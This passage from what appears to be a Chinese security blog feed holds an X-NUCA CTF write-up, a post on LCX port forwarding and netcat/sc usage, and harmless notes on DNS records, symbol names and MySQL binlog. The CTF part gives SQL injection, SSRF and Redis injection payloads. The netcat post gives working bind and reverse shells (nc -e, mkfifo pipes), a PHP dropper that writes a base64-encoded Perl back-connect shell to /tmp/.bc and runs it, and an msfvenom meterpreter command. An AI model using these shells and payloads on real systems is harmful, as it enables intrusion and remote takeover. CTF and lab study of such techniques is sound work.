class="line">		alert(4)--&gt;")</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- 注意两个script标签别放一起 --&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Xnuca_Writeup]]></title>
      <url>http://csser.work/08/01/2016/x-nuca-writeup/</url>
      <content type="html"><![CDATA[<p>跟着老司机学着打的..名次就不提了= =</p>
<h3 id="BaseInjection"><a href="#BaseInjection" class="headerlink" title="BaseInjection"></a>BaseInjection</h3><p>万能密码<br>post: username=admin’||1#&amp;password=aaa</p>
<h3 id="BaseReconstrction"><a href="#BaseReconstrction" class="headerlink" title="BaseReconstrction"></a>BaseReconstrction</h3><p>重构, payload和BaseInjection相同</p>
<h3 id="Counting-Stars"><a href="#Counting-Stars" class="headerlink" title="Counting Stars"></a>Counting Stars</h3><p>查看备注=&gt; mac备份 .DS_Store<br>hex分析发现一个zip: epLF1rEihQp5AjCUcgGry330jkFSC1C7.zip<br>kali中binwalk跑一下发现如下代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$S=<span class="string">"song"</span>;</span><br><span class="line">$song=<span class="string">"says"</span>;</span><br><span class="line">$says=<span class="string">"no"</span>;</span><br><span class="line">$no=<span class="string">"more"</span>;</span><br><span class="line">$more=<span class="string">"d0llars"</span>;</span><br><span class="line">$d0llars=<span class="string">"counting"</span>;</span><br><span class="line">$counting=<span class="string">"star"</span>;</span><br><span class="line">$star=<span class="string">"S"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div style="text-align:center"&gt;What is $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S&lt;/div&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">"check.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"answer"</span> value=<span class="string">""</span> /&gt;  </span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个代码吧里面的$那拉出来echo一下就行了…<br>那么向check.php发个请求包即可(用的postman), post数据为 ‘answser=d0llars’</p>
<h3 id="Invisible"><a href="#Invisible" class="headerlink" title="Invisible"></a>Invisible</h3><p>添加头<code>X-FORWORDED-FOR</code></p>
<h3 id="Normal-normal"><a href="#Normal-normal" class="headerlink" title="Normal_normal"></a>Normal_normal</h3><p>phpwind + phpbb 的模板, 两个后台地址: /phpwind/admin.php /admin.php 不知道几个意思..<br>通过发帖人进行社工, 找到:<br>帐号zhangrendao密码zhang2010<br>通过<a href="http://www.wooyun.org/bugs/wooyun-2015-0104256" target="_blank" rel="external">wooyun</a>这篇文章直接getshell<br>不过简单的菜刀连接不能用(token限制)<br>最后通过的是<a href="https://gist.github.com/a1exlism/c303f545a119bfdd36018f86a8f9f6e3" target="_blank" rel="external">目录遍历</a>搞得2333</p>
<h3 id="DBexplorer"><a href="#DBexplorer" class="headerlink" title="DBexplorer"></a>DBexplorer</h3><p>有了提示才懂233<br>vim的缓存文件.db.php.swp找到phpmyadmin地址和帐号密码<br>username:ctfdb    password:ctfmysql123<br>提示有<code>user.MYD</code>, 然后有个文件读写权限的库test..<br>还有个<code>@@datadir</code>也是学到了, (我还是自己find出来手工测试的地址…)</p>
<blockquote>
<p>payload<br>LOAD DATA INFILE ‘/var/lib/mysql/mysql/user.MYD’ INTO TABLE q fields terminated by ‘LINES’ TERMINATED BY ‘\0’</p>
</blockquote>
<p>也认识了一些文件读取命令: 大文件LOAD DATA INFILE | Pt-fifo-split 一般文件 | load_file<br>至于load_file为什么不能读user.MYD我也不是很懂了…</p>
<p>后面就是简单的登录就行了</p>
<h3 id="RotatePicture"><a href="#RotatePicture" class="headerlink" title="RotatePicture"></a>RotatePicture</h3><p>提示：urlopen file schema<br>相关: SSRF file协议<br>(一开始还想上传漏洞什么的)</p>
<blockquote>
<p>file:///etc/passwd #单行显示<br>file:///views.py # 找到了一个地址/getredisvalue</p>
</blockquote>
<p>找到了内网端口<code>6379</code>, 通过Python urllib HTTP Header Injection进行内网的rediis攻击<br>Reference: <a href="http://drops.wooyun.org/papers/16905" target="_blank" rel="external">wooyun</a><br><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">TSRC</a></p>
<blockquote>
<p>paylaod<br><a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a><br>set c46fb8d3-6322-42ba-8919-dc4b914714db 123<br>:6379</p>
</blockquote>
<p>uuid: c46fb8d3-6322-42ba-8919-dc4b914714db 12345</p>
<h3 id="AdminLogin"><a href="#AdminLogin" class="headerlink" title="AdminLogin"></a>AdminLogin</h3><p>(这个我想吐槽.. ip到底怎么检测的…)<br>注入地址: <code>/news.php?newsid=1</code> 插件还是ff的hackerbar比较友好..添加一个referer: <code>http://question9.erangelab.com/index.php</code><br>由于可以直接爆库报表爆字段, 那就直接给答案好了(mysql的):<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctfphp</span><br><span class="line">	&gt;admin <span class="comment">; news</span></span><br><span class="line">		&gt;id,name,pass <span class="comment">; id,title,content</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ctfadmin</span><br><span class="line"></span>a<span class="number">2224f</span><span class="number">1b</span>f263d<span class="number">26b</span>ab<span class="number">1994723f</span>7565<span class="built_in">a3</span>(administrat0r)</span><br></pre></td></tr></table></figure></p>
<p>期间主办方默默的改了ip.. 跪了<br>postman ==&gt; <a href="http://121.195.186.238/xnucactfwebadmin/logincheck.php" target="_blank" rel="external">http://121.195.186.238/xnucactfwebadmin/logincheck.php</a><br>postdata: username, password ,submit<br>加一个header: </p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[lcx_nc_sc in Windows & Linux]]></title>
      <url>http://csser.work/07/19/2016/lcx-nc-sc/</url>
      <content type="html"><![CDATA[<h2 id="端口转发神器-LCX"><a href="#端口转发神器-LCX" class="headerlink" title="端口转发神器 LCX"></a>端口转发神器 LCX</h2><p>LCX可以进行端口转发</p>
<h3 id="内网渗透样例"><a href="#内网渗透样例" class="headerlink" title="内网渗透样例"></a>内网渗透样例</h3><pre><code>原理: ![0](/imgs/windowsLcx/lcx.png)
Cracker控制的主机A(内外网)开了一个端口映射到Target主机B(仅内网)的3389

由于lcx版本问题, 所以linux和win下并不一样, 具体`help`即可
</code></pre><h4 id="envirnoment"><a href="#envirnoment" class="headerlink" title="envirnoment"></a>envirnoment</h4><pre><code>attacker --&gt; Linux
Extranet-port: 2333
Intranet-port: 6666
win:         192.168.55.130
linux:    192.168.55.128
</code></pre><h4 id="mid-linux-victim-win"><a href="#mid-linux-victim-win" class="headerlink" title="mid-linux victim-win"></a>mid-linux victim-win</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker (Extranet)</span></span><br><span class="line">remmina <span class="comment"># Linux remote desktop client</span></span><br><span class="line"><span class="comment"># middle ware (Extranet &amp; Intranet)</span></span><br><span class="line">./lcx -m 2 -p1 2333 -p2 6666</span><br><span class="line"><span class="comment"># victim (Intranet)</span></span><br><span class="line">Lcx.exe -slave 192.168.55.128 6666 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
<p><img src="/imgs/windowsLcx/attacker.png" alt="1"><br><img src="/imgs/windowsLcx/middle.png" alt="2"><br><img src="/imgs/windowsLcx/victim.png" alt="3"></p>
<h4 id="mid-win-victim-linux"><a href="#mid-win-victim-linux" class="headerlink" title="mid-win victim-linux"></a>mid-win victim-linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker (Extranet)</span></span><br><span class="line">ssh root@192.168.55.130 -p 2333</span><br><span class="line"><span class="comment"># middle ware (Extranet &amp; Intranet)</span></span><br><span class="line">Lcx.exe -listen 2333 6666</span><br><span class="line"><span class="comment"># victim (Intranet)</span></span><br><span class="line">./lcx -m 3 -h1 192.168.55.130 -p1 6666 -h2 127.0.0.1 -p2 3389</span><br></pre></td></tr></table></figure>
<p><img src="/imgs/windowsLcx/attacker_2.png" alt="1"><br><img src="/imgs/windowsLcx/middle_2.png" alt="2"><br><img src="/imgs/windowsLcx/victim_2.png" alt="3"></p>
<h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><h3 id="options"><a href="#options" class="headerlink" title="options"></a>options</h3><p>-i Interval, time delay<br>-C CRLF作为换行<br>-p port<br>-l Listen. Using with -p -s -z<br>-s Source IP<br>-u UDP protocal</p>
<h3 id="open-shell"><a href="#open-shell" class="headerlink" title="open shell"></a>open shell</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(server)</span></span><br><span class="line">.\YourNCPath\nc.exe <span class="_">-l</span> -p 3333 -v <span class="_">-e</span> cmd.exe</span><br><span class="line"><span class="comment"># attacker(client)</span></span><br><span class="line">nc TargetIP 3333</span><br></pre></td></tr></table></figure>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(server)</span></span><br><span class="line">nc -lvvp 6666 <span class="_">-e</span> /bin/bash</span><br><span class="line"><span class="comment"># attacker(client)</span></span><br><span class="line">nc TargetIP 6666</span><br></pre></td></tr></table></figure>
<h3 id="nc-reverse-shell"><a href="#nc-reverse-shell" class="headerlink" title="nc reverse shell"></a>nc reverse shell</h3><p>shell反弹是将attacker作为开放机来进行一个操作, 这样就避免了victim的防护检测(自己往外面的正向连接)<br>0x01. 基础NC反弹(-e)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker(server)</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line"><span class="comment"># target(client)</span></span><br><span class="line">nc <span class="_">-e</span> /bin/bash AttackerIP 6666</span><br></pre></td></tr></table></figure></p>
<p>0x02. 本地双端口监听, 一个出一个进<br>本地测试,似乎可以<code>持久化</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker(server)</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line"><span class="comment"># target(client)</span></span><br><span class="line">rm /tmp/backpipe;</span><br><span class="line">mkfifo /tmp/backpipe;	<span class="comment">#创建管道 一进一出</span></span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.55.1 6666 1&gt;/tmp/backpipe</span><br><span class="line"><span class="comment">#设置读写 stdin:0 stdout:1</span></span><br></pre></td></tr></table></figure></p>
<p>0x03. PHP编译环境下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123;</span><br><span class="line">    $path = execute(<span class="string">"which $pr"</span>);</span><br><span class="line">    <span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123;</span><br><span class="line">    $res = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($cfe, $res);</span><br><span class="line">            $res = join(<span class="string">"\n"</span>, $res);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            $res = @shell_exec($cfe);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @ob_start();</span><br><span class="line">            @system($cfe);</span><br><span class="line">            $res = @ob_get_contents();</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @ob_start();</span><br><span class="line">            @passthru($cfe);</span><br><span class="line">            $res = @ob_get_contents();</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (@is_resource($f = @popen($cfe, <span class="string">"r"</span>))) &#123;</span><br><span class="line">            $res = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">while</span> (!@feof($f)) &#123;</span><br><span class="line">                $res.= @fread($f, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname, $text)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($fp = @fopen($fname, <span class="string">'w'</span>)) &#123;</span><br><span class="line">        @fputs($fp, @base64_decode($text));</span><br><span class="line">        @fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = <span class="string">"x.x.x.x"</span>;</span><br><span class="line">$yourport = <span class="string">"8000"</span>;</span><br><span class="line">$usedb = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'perl'</span> =&gt; <span class="string">'perl'</span>,</span><br><span class="line">    <span class="string">'c'</span> =&gt; <span class="string">'c'</span></span><br><span class="line">);</span><br><span class="line">$back_connect = <span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span> . <span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span> . <span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span> . <span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span> . <span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span> . <span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span> . <span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>, $back_connect);</span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>) . <span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>0x04. msf生成reverse.xx作为反弹(只是其中一个例子)</p>
<blockquote>
<p><a href="http://netsec.ws/?p=331" target="_blank" rel="external">NETSEC</a><br>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</your></your></p>
</blockquote>
<h2 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h2><p>这个和Linux中的service挺像的, 具体利用到时候再说吧233<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc &lt;server&gt; [<span class="built_in">command</span>][service name]&lt;option1&gt;&lt;option2&gt;...</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><a href="http://www.admin10000.com/document/65.html" target="_blank" rel="external">sc.exe-全栈开发者</a><br>sc query     //查询所有服务status<br>sc query service //单个<br>sc qc service # service config<br>    sc start service //example: service apache2.2<br>    sc stop service<br>    sc delete service<br>sc config service start= auto|demand|disabled<br>// example: sc config apache2.2 start= demand，将apache设置为手动启动。<code>start=后面有一个空格</code></p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wrfly.kfd.me/linux-lcx/" target="_blank" rel="external">Linux Lcx</a><br><a href="http://www.secpulse.com/archives/6341.html" target="_blank" rel="external">LCX端口转发-51CTO</a><br><a href="http://www.oschina.net/translate/linux-netcat-command" target="_blank" rel="external">NetCat-OSChina</a><br><a href="http://man.linuxde.net/nc_netcat" target="_blank" rel="external">nc-linuxde</a><br><a href="https://jkeohan.wordpress.com/2010/04/30/using-netcat-to-spawn-a-remote-shell/" target="_blank" rel="external">nc-jkeohan</a><br><a href="http://www.oschina.net/translate/linux-netcat-command?p=1#comments" target="_blank" rel="external">LinuxNC-oschina</a><br><a href="https://www.91ri.org/9367.html?yundun=240666326ef9041d5f17" target="_blank" rel="external">shell-91ri</a><br><a href="http://www.admin10000.com/document/65.html" target="_blank" rel="external">sc.exe-全栈开发者</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[DNS SOA NS记录]]></title>
      <url>http://csser.work/07/07/2016/dns-soa/</url>
      <content type="html"><![CDATA[<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p><br><br><br><br><br><!-- 不知道为什么这个排版有这么个问题 --><br>看到一个dns域传送漏洞, 顺便了解了一下概念</p>
<h3 id="網中人"><a href="#網中人" class="headerlink" title="網中人"></a>網中人</h3><p>(↑鸟哥的早期导师↑)</p>
<blockquote>
<p>ns 授權很簡單…<br>假設你註冊的 domain 叫 abc.com ，而你有 ns1  與 ns2 兩台 server 。<br>那，你必需從 .com 的權威伺服器授權給你，其設定或類似如此：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ORIGIN com.</span><br><span class="line">abc IN NS ns1.abc.com.</span><br><span class="line">abc IN NS ns2.abc.com.</span><br><span class="line">ns1.abc IN A 1.2.3.4</span><br><span class="line">ns1.abc IN A 1.2.3.5</span><br></pre></td></tr></table></figure></p>
<p>然後，你的 ns1 或 ns2 都可是權威伺服器了(各自的 SOA 設為自己即可)。<br>在 abc.com 的 db 中，最少還應類似如下的設定：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ORIGIN abc.com.</span><br><span class="line">@ IN NS ns1.abc.com.</span><br><span class="line">@ IN NS ns2.abc.com.</span><br><span class="line">ns1 IN A 1.2.3.4</span><br><span class="line">ns2 IN A 1.2.3.5</span><br></pre></td></tr></table></figure></p>
<p>不過，既然 SOA 是自己的話，那事實上，我可以改變 ns 或增加 ns 授權：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ORIGIN abc.com.</span><br><span class="line">@ IN NS ns1.abc.com.</span><br><span class="line">@ IN NS ns2.</span><br><span class="line">@ IN NS ns3.abc.com.</span><br><span class="line">ns1 IN A 1.2.3.4</span><br><span class="line">ns2 IN A 1.2.3.5</span><br><span class="line">ns3 IN A 1.2.3.6</span><br></pre></td></tr></table></figure></p>
<p>假如你有 sub-zone 要授權，事實上也是利用 ns 啦：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ORIGIN abc.com.</span><br><span class="line">sub1 IN NS ns1.sub1.abc.com.</span><br><span class="line">sub1 IN NS ns2.sub1.abc.com.</span><br><span class="line">ns1.sub1 IN A 4.3.2.1</span><br><span class="line">ns2.sub1 IN A 4.3.2.2</span><br></pre></td></tr></table></figure></p>
<p>然而，不同版本的 resolver ，對最終的 ns 判定是不一樣的：<br>bind9 是以 abc.com 的權威主機的 ns 為依據，若找不到，那就沒結果。<br>而之前的版本，則可退而求次，以 com. 裡關於 abc.com 的 ns 為答案。</p>
</blockquote>
<h3 id="笑蓝一方天"><a href="#笑蓝一方天" class="headerlink" title="笑蓝一方天"></a>笑蓝一方天</h3><blockquote>
<p>大过年的，拉家常的话说吧。你缺钱了找你爸要，你爸NS到你妈，你去找你妈。你妈(拥有soa)给你钱。</p>
</blockquote>
<p>soa(Start of Authority), NS(name server)<br>两个英文意思一出来再看看上面也就懂了吧^_^</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.zhihu.com/question/40028869" target="_blank" rel="external">dns的soa记录与ns记录到底有什么不同-zhihu</a><br><a href="http://www.chinaunix.net/old_jh/16/250360.html" target="_blank" rel="external">dns中soa和ns记录的作用-chinaunix</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Symbols in English~]]></title>
      <url>http://csser.work/07/05/2016/symbol-en-names/</url>
      <content type="html"><![CDATA[<p>原网址总感觉页面要挂, 还是转载一份过来好了…  </p>
<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>+　 plus　加号；正号</p>
<p>-　 minus　减号；负号</p>
<p>±　plus or minus　正负号</p>
<p>×　is multiplied by　乘号</p>
<p>÷　is divided by　除号</p>
<p>＝　is equal to　等于号</p>
<p>≠　is not equal to　不等于号</p>
<p>≡　is equivalent to　全等于号</p>
<p>≌　is equal to or approximately equal to　等于或约等于号</p>
<p>≈　is approximately equal to　约等于号</p>
<p>＜　is less than　小于号</p>
<p>＞　is greater than　大于号</p>
<p>≮　is not less than　不小于号</p>
<p>≯　is not more than　不大于号</p>
<p>≤　is less than or equal to　小于或等于号</p>
<p>≥　is more than or equal to　大于或等于号</p>
<p>你知道这些符号的英文说法吗？</p>
<p>%　 per cent　百分之……</p>
<p>‰　per mill 千分之……</p>
<p>∞　infinity　无限大号</p>
<p>∝　varies as　与……成比例</p>
<p>√　(square) root　（平方）根</p>
<p>∵　since; because　因为</p>
<p>∴　hence　所以</p>
<p>∷　equals; as (proportion)　等于；成比例</p>
<p>∠　angle　角</p>
<p>⌒　semicircle　半圆</p>
<p>⊙　circle　圆</p>
<p>○　circumference　圆周</p>
<p>π　pi 圆周率</p>
<p>△　triangle　三角形</p>
<p>⊥　perpendicular to　垂直于</p>
<p>∪　union of　并；合集</p>
<p>∩　intersection of 交；通集</p>
<p>∫　the integral of ……的积分</p>
<p>∑　(sigma) summation of　总和</p>
<p>°　degree　度</p>
<p>′　minute　分</p>
<p>″　second　秒</p>
<p>℃　Celsius system　摄氏度</p>
<p>{　open brace; open curly　左花括号</p>
<p>}　close brace; close curly　右花括号</p>
<p>(　open parenthesis; open paren　左圆括号</p>
<p>)　close parenthesis; close paren　右圆括号</p>
<p>() brakets; parentheses　括号</p>
<p>[　open bracket 左方括号</p>
<p>]　close bracket 右方括号</p>
<p>[] square brackets　方括号</p>
<p>.　period; dot　句号；点</p>
<p>|　vertical bar; vertical virgule　竖线</p>
<p>&amp;　ampersand; and; reference; ref　和；引用</p>
<p>*　asterisk; multiply; star; pointer　星号；乘号；星；指针</p>
<p>/　slash; divide; oblique 斜线；斜杠；除号</p>
<p>//　slash-slash; comment 双斜线；注释符</p>
<p>#　pound　井号</p>
<p>\　backslash; sometimes escape　反斜线转义符；有时表示转义符或续行符</p>
<p>~　tilde　波浪符</p>
<p>.　full stop　句号</p>
<p>,　comma　逗号</p>
<p>:　colon　冒号</p>
<p>;　semicolon　分号</p>
<p>?　question mark　问号</p>
<p>!　exclamation mark (英式英语)；exclamation point (美式英语)</p>
<p>‘　apostrophe　撇号；省字符</p>
<p>-　hyphen　连字号</p>
<p>– dash 破折号</p>
<p>…　dots/ellipsis　省略号</p>
<p>“　single quotation marks 单引号</p>
<p>“”　double quotation marks 双引号</p>
<p>‖ parallel 双线号</p>
<p>&amp;　ampersand = and</p>
<p>～　swung dash 代字号</p>
<p>§　section; division 分节号</p>
<p>→　arrow 箭号；参见号</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://language.chinadaily.com.cn/trans/2010-09/08/content_11276232.htm" target="_blank" rel="external">你知道这些符号的英文说法吗?-ChinaDaily</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[mysql命令打错回退]]></title>
      <url>http://csser.work/07/02/2016/mysql-binlog/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习mysql过程中无意中写了两遍同样的语句, 然后就有这篇博客了<br>注意: 恢复的前提是已经开启bin_log了(所以我也晚了一步)</p>
<h2 id="Version-Number"><a href="#Version-Number" class="headerlink" title="Version Number"></a>Version Number</h2><p>mysql  Ver 14.14 Distrib <code>5.7.12</code>, for Linux (x86_64) using  EditLine wrapper</p>
<h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><h3 id="Configure-binlog"><a href="#Configure-binlog" class="headerlink" title="Configure binlog"></a>Configure binlog</h3><p>mysql的配置文件在<code>/etc/my.cnf</code><br><del>find / -type f -name “.cnf” | xargs grep “mysqld”能找到真实地址,后话</del><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 添加</span><br><span class="line">[mysqld]</span><br><span class="line">server_id=100 #为server配置一个id</span><br><span class="line">log-bin=/tmp/mysql-binlog #名字随便取</span><br></pre></td></tr></table></figure></p>
<p>service mysql restart</p>
